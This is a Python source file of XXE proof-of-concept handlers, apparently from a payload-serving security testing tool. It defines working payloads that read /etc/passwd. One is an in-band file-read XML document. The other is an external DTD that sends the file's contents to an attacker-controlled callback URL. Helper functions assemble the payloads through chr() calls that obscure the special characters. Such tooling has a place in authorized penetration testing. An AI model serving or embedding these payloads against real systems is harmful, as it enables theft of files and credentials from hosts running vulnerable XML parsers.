"""XXE PoC handlers"""
from ..base import poc, PocRequest, PocResponse


@poc(
    name="xxe-dtd",
    description="XXE DTD exfil",
    category="xxe",
    content_type="application/xml-dtd",
    response_body='<!ENTITY % data SYSTEM "file:///etc/passwd">\n<!ENTITY % p1 "<!ENTITY exfil SYSTEM \'{{callback_url}}?_exfil=1&_type=file&_data=%data;\'>">\n%p1;',
    enable_variables=True,
)
async def xxe_dtd(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = _build_dtd(cb)
    return PocResponse(body=body, content_type="application/xml-dtd")


@poc(
    name="xxe-file",
    description="XXE file read",
    category="xxe",
    content_type="application/xml",
    response_body='<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<data>&xxe;</data>',
)
async def xxe_file(req: PocRequest) -> PocResponse:
    return PocResponse(body=_build_xml(), content_type="application/xml")


def _build_dtd(cb):
    p, a = chr(37), chr(38)
    l1 = '<!ENTITY ' + p + ' data SYSTEM "file:///etc/passwd">'
    l2 = ('<!ENTITY ' + p + ' p1 "<!ENTITY exfil SYSTEM ' + chr(39)
          + cb + '?_exfil=1' + a + '_type=file' + a + '_data='
          + p + 'data;' + chr(39) + '>">')
    l3 = p + 'p1;'
    return "\n".join([l1, l2, l3])


def _build_xml():
    a = chr(38)
    lines = []
    lines.append('<?xml version="1.0"?>')
    lines.append('<!DOCTYPE foo [')
    lines.append('<!ENTITY xxe SYSTEM "file:///etc/passwd">')
    lines.append(']>')
    lines.append('<data>' + a + 'xxe;</data>')
    return "\n".join(lines)
